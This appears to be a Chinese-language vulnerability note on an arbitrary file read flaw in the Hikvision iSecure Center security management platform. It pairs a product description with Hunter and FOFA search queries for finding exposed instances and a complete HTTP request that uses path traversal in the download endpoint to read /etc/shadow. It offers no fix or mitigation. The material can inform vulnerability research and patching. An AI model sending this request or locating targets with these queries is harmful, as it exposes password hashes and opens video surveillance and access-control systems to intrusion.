# 海康威视iSecure Center 综合安防管理平台download任意文件读取漏洞

# 1、漏洞描述
<font style="color:rgb(0, 0, 0);">HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，获取边缘节点数据，实现安防信息化集成与联动，以电子地图为载体，融合各系统能力实现丰富的智能应用。HIKVISION iSecure Center平台基于“统一软件技术架构”先进理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、统一配置、统一管理和统一调度。海康威视iSecure Center 综合安防管理平台download任意文件读取漏洞</font>

# <font style="color:rgb(0, 0, 0);">2、影响版本</font>
<font style="color:rgb(0, 0, 0);">HIKVISION iSecure Center综合安防管理平台 </font>

![1691858087491-a6e46e3a-cb01-43dc-9dfc-382889c5dcae.png](./img/YR0nPcEELd6uSCWt/1691858087491-a6e46e3a-cb01-43dc-9dfc-382889c5dcae-599682.png)

# <font style="color:rgb(0, 0, 0);">3、资产测绘</font>
**hunter查询语法：**

`app.name=="Hikvision 海康威视 iSecure Center"`

fofa：`title="综合安防管理平台"`

# 4、漏洞复现
```java
GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/shadow HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

![1717149873962-7544801a-20c4-4831-a338-b486e5c32913.png](./img/YR0nPcEELd6uSCWt/1717149873962-7544801a-20c4-4831-a338-b486e5c32913-126761.png)



> 更新: 2024-06-01 11:04:36  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/soa7px4tqz4enpdm>